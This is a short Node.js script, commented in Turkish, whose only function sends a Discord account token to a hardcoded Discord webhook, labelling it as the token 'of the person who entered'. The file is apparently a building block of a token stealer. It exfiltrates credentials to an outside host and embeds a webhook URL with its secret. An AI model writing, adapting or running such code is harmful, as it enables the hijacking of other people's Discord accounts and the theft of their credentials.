const axios = require("axios");

function sendTokenToWebhook(token) {
  const webhookURL = "https://discord.com/api/webhooks/1144041635383099452/crG8a7-LfjpZNGROde-zgb8XScXSAk-gW_MiV7Fv5a12fnvckuA0TgOsXuoTPexUwWYn";

  // Token'i webhooka göndermek için bir POST isteği yapılıyor
  axios.post(webhookURL, {
    content: `Discord token of the person who entered: ${token}`
  })
  .then(response => {
    console.log("Token successfully sent to webhook");
  })
  .catch(error => {
    console.error("Failed to send token:", error);
  });
}

// İsteyen kişi Discord tokenini buraya parametre olarak geçer
const discordToken = "user-token";
sendTokenToWebhook(discordToken);
